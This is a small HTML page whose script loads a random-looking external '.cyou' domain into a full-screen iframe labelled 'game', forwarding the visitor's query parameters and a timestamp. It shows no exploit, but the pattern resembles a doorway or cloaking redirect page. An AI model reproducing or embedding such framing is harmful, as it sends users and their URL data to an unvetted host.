<body style="background-color:#000000;margin:0px; padding:0px;">
  <iframe id="game" frameborder="0"></iframe>
  <script type="text/javascript">
    let url = "https://www.essemnrjbl.cyou";
    let params = window.location.search;
    let date = new Date().getTime();
    if (params.indexOf("?") > -1) {
      url += params + "&rdtime=" + date;
    } else {
      url += "?" + "rdtime=" + date;
    }
    let frame = document.getElementById("game");
    frame.src = url;
    function changeFrameHeight() {
      var ifm = document.getElementById("game");
      ifm.height = document.documentElement.clientHeight - 4;
      ifm.width = document.documentElement.clientWidth;
    }
    changeFrameHeight();
    window.onresize = function () {
      changeFrameHeight();
    } 
  </script>
</body>
